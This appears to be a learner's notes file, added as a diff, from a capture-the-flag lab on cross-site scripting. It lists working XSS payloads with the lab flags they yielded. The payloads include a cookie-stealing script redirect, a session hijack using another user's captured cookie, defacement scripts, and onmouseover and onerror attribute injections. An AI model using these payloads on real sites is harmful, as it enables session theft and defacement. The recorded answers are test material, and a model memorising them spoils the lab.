@@ -1,0 +1,78 @@
+<p>HEY, whoami</p>
+
+HTML_T4gs
+
+
+<script>alert(document.cookies)</script>
+W3LL_D0N3_LVL2s
+
+<script>document.querySelector('#thm-title').textContent = 'i am a hacker'</script>
+
+websites_can_be_easily_defaced_with_xss
+
+BSE2022X
+
+
+<script>document.location='/log/'+document.cookie</script>
+
+F12 --> storage --> cookies
+my cookies
+s%3AusbnukNZriUw_BNx6wH0TRofjOJYIt0o.TZ9JbvNGImFNx3li%2BhwWpPe39xnAmwtcf4U3hL1AKJQ
+
+
+view http://10.10.18.87/logs
+connect.sid s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE
+
+--> cookies of Jack: s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE
+Change my cookies by jack's cookies  ->> comment
+--> c00ki3_stealing_
+
+
+
+<script>alert("Hello")</script>
+ThereIsMoreToXSSThanYouThink
+
+<script>alert(window.location.hostname)</script>
+ReflectiveXss4TheWin
+
+test" onmouseover="alert('Hover over the image and inspect the image element')"
+test" onmouseover="alert(document.cookies)"
+xxx" onmouseover="alert(document.cookie)
+
+connect.sid=s%3AUUmfvPSeS82xvIUizHbgqZVm6weaNL7_.jUttn4PinukndYd4UssAwiFPAsMf7gTay1yexyTwyjk
+
+BreakingAnElementsTag
+
+test" onmouseover="alert(document.body.style.backgroundColor = "red")
+document.body.style.backgroundColor = "red"
+
+xxx" onhover ="document.body.style.backgroundColor = "red"
+
+nothing happens
+
+xxx" onmouseover ="document.body.style.backgroundColor = "red";
+
+xxx" onmouseover = "document.body.style.backgroundColor = "red"
+xxx" onmouseover ="document.body.style.backgroundColor="red";
+
+xxx" onhover="document.body.style.backgroundColor='red'
+
+JavaScriptIsAwesome   <<--i don't understand???>>
+
+<img src="blah" onerror=alert("Hello") />
+3c3cf8d90aaece81710ab9db759352c0
+
+<img src="blah" onerror=confirm("Hello") />
+Ans :- a2e5ef66f5ff584a01d734ef5edaae91
+
+<img src="blah" onerror=alert("HHelloello") />
+decba45d0eff17c6eedf1629393bee1d
+
+
+<img src="blah" ONERROR="alert('HHelloello')" />
+2482d2e8939fc85a9363617782270555
+
+
+https://tryhackme.com/room/xss
+https://www.kumaratuljaiswal.in/2020/08/tryhackme-cross-site-scripting.html
+https://ratiros01.medium.com/tryhackme-cross-site-scripting-140773f9e022
